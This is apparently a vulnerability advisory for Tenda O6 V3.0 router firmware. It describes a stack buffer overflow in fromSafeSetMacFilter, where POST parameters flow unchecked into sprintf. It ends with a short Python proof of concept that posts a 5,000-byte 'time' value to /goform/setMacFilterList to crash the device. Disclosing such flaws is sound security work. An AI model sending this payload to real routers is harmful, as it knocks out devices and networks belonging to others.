## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-3861.html

## Affected version

O6 V3.0 V1.0.0.7(2054)

## Vulnerability details

In the O6 V3.0 V1.0.0.7(2054) firmware has a stack overflow vulnerability in the `fromSafeSetMacFilter` function. The `v2, format, v5` variable receives the `remark, type, time` parameter from a POST request. However, since the user can control the input of `remark, type, time`, the statement `sprintf(v33, "%d;%s;%d;%s;%s", v8 + 1, v2, v7 + 2, format, (const char *)v76);` can cause a buffer overflow. The user-provided  `remark, type, time` can exceed the capacity of the `v33` array, triggering this security vulnerability.

![image-20240801133046551](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240801133046551.png)

![image-20240801133019609](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240801133019609.png)

![image-20240801133035717](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240801133035717.png)

![image-20240801133209667](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240801133209667.png)

## POC

```python
import requests

ip = "192.168.84.101"
url = "http://" + ip + "/goform/setMacFilterList"
payload = b"a"*5000

data = {"action": "add", "time": payload}
response = requests.post(url, data=data)
```
